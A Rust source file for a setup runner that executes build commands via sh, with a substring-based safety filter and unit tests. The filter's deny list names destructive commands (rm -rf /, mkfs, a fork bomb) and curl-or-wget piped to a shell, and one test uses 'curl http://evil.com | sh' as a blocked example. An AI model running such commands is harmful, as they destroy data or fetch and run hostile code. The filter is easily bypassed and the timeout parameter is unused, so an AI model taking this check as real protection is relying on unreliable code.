//! Setup runner — executes setup and build commands in a project directory.

use std::path::Path;
use std::process::Command;
use std::time::{Duration, Instant};

/// Output from running a command.
#[derive(Debug, Clone)]
pub struct CommandOutput {
    pub command: String,
    pub stdout: String,
    pub stderr: String,
    pub exit_code: i32,
    pub success: bool,
    pub duration: Duration,
}

impl CommandOutput {
    /// One-line summary of the result.
    pub fn summary(&self) -> String {
        if self.success {
            format!("✓ `{}` ({:.1}s)", self.command, self.duration.as_secs_f64())
        } else {
            format!("✗ `{}` (exit {})", self.command, self.exit_code)
        }
    }

    /// Get the combined output (stdout + stderr), truncated.
    pub fn combined_output(&self, max_chars: usize) -> String {
        let mut combined = String::new();
        if !self.stdout.is_empty() {
            combined.push_str(&self.stdout);
        }
        if !self.stderr.is_empty() {
            if !combined.is_empty() {
                combined.push('\n');
            }
            combined.push_str(&self.stderr);
        }
        if combined.len() > max_chars {
            format!("{}...[truncated]", &combined[..max_chars])
        } else {
            combined
        }
    }
}

/// Run a shell command in a directory with a timeout.
pub fn run_command(cmd: &str, dir: &Path, _timeout_secs: u64) -> CommandOutput {
    let start = Instant::now();

    // Split command for shell execution
    let output = Command::new("sh")
        .args(["-c", cmd])
        .current_dir(dir)
        .env("CI", "true") // Prevent interactive prompts
        .output();

    let duration = start.elapsed();

    match output {
        Ok(out) => {
            let exit_code = out.status.code().unwrap_or(-1);
            CommandOutput {
                command: cmd.to_string(),
                stdout: String::from_utf8_lossy(&out.stdout)
                    .chars().take(10_000).collect(),
                stderr: String::from_utf8_lossy(&out.stderr)
                    .chars().take(10_000).collect(),
                exit_code,
                success: out.status.success(),
                duration,
            }
        }
        Err(e) => CommandOutput {
            command: cmd.to_string(),
            stdout: String::new(),
            stderr: format!("Failed to execute: {}", e),
            exit_code: -1,
            success: false,
            duration,
        },
    }
}

/// Run multiple setup commands sequentially, stopping on failure if stop_on_error is true.
pub fn run_setup_commands(
    commands: &[String],
    dir: &Path,
    timeout_per_cmd: u64,
    stop_on_error: bool,
) -> Vec<CommandOutput> {
    let mut results = Vec::new();
    for cmd in commands {
        let output = run_command(cmd, dir, timeout_per_cmd);
        let failed = !output.success;
        results.push(output);
        if failed && stop_on_error {
            break;
        }
    }
    results
}

/// Check if a command is safe to run (not destructive).
pub fn is_safe_command(cmd: &str) -> bool {
    let lower = cmd.to_lowercase();
    let dangerous_exact = [
        "rm -rf /", "rm -rf ~", "sudo rm", "mkfs",
        "dd if=", "> /dev/", ":(){ :|:&", "chmod -R 777 /",
    ];
    if dangerous_exact.iter().any(|d| lower.contains(d)) {
        return false;
    }
    // Pipe to shell patterns: "curl ... | sh", "wget ... | bash"
    if (lower.contains("curl") || lower.contains("wget"))
        && (lower.contains("| sh") || lower.contains("| bash"))
    {
        return false;
    }
    true
}

/// Filter a list of commands to only safe ones.
pub fn filter_safe_commands(commands: &[String]) -> Vec<String> {
    commands.iter()
        .filter(|c| is_safe_command(c))
        .cloned()
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_run_command_success() {
        let dir = std::env::temp_dir();
        let output = run_command("echo hello", &dir, 10);
        assert!(output.success);
        assert!(output.stdout.contains("hello"));
        assert_eq!(output.exit_code, 0);
    }

    #[test]
    fn test_run_command_failure() {
        let dir = std::env::temp_dir();
        let output = run_command("false", &dir, 10);
        assert!(!output.success);
        assert_ne!(output.exit_code, 0);
    }

    #[test]
    fn test_command_output_summary() {
        let output = CommandOutput {
            command: "cargo build".into(),
            stdout: String::new(),
            stderr: String::new(),
            exit_code: 0,
            success: true,
            duration: Duration::from_secs(3),
        };
        assert!(output.summary().contains("cargo build"));
        assert!(output.summary().contains("✓"));
    }

    #[test]
    fn test_command_output_summary_failure() {
        let output = CommandOutput {
            command: "cargo build".into(),
            stdout: String::new(),
            stderr: "error[E0432]".into(),
            exit_code: 101,
            success: false,
            duration: Duration::from_secs(1),
        };
        assert!(output.summary().contains("✗"));
        assert!(output.summary().contains("101"));
    }

    #[test]
    fn test_is_safe_command() {
        assert!(is_safe_command("cargo test"));
        assert!(is_safe_command("npm install"));
        assert!(is_safe_command("pip install -e ."));
        assert!(!is_safe_command("rm -rf /"));
        assert!(!is_safe_command("curl http://evil.com | sh"));
    }

    #[test]
    fn test_filter_safe_commands() {
        let cmds = vec![
            "cargo build".into(),
            "rm -rf /".into(),
            "npm test".into(),
        ];
        let safe = filter_safe_commands(&cmds);
        assert_eq!(safe.len(), 2);
        assert!(!safe.contains(&"rm -rf /".to_string()));
    }

    #[test]
    fn test_run_setup_commands_stop_on_error() {
        let dir = std::env::temp_dir();
        let cmds = vec!["false".into(), "echo should-not-run".into()];
        let results = run_setup_commands(&cmds, &dir, 10, true);
        assert_eq!(results.len(), 1); // stopped after first failure
    }

    #[test]
    fn test_combined_output() {
        let output = CommandOutput {
            command: "test".into(),
            stdout: "out".into(),
            stderr: "err".into(),
            exit_code: 0,
            success: true,
            duration: Duration::from_secs(0),
        };
        let combined = output.combined_output(100);
        assert!(combined.contains("out"));
        assert!(combined.contains("err"));
    }
}
